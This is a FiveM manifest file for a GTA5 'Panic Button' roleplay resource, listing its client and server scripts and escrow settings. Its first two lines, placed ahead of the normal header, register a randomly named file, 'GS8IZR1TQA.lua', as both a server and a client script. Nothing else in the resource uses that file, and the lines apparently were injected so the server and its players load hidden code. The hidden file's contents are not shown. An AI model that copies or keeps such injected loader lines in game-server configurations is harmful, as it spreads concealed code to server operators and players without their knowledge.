server_script "GS8IZR1TQA.lua"
client_script "GS8IZR1TQA.lua"
fx_version 'cerulean'
games {'gta5'}
lua54 'yes'

author 'SirLamaGott'
description 'Lama - Panic Button'
version '0.1.0'

shared_script '@es_extended/imports.lua'
client_scripts {
	'client/main.lua'
}

server_scripts {
	'server/main.lua'
}
 
escrow_ignore {
  'server/*.lua',
  'client/*.lua'
} 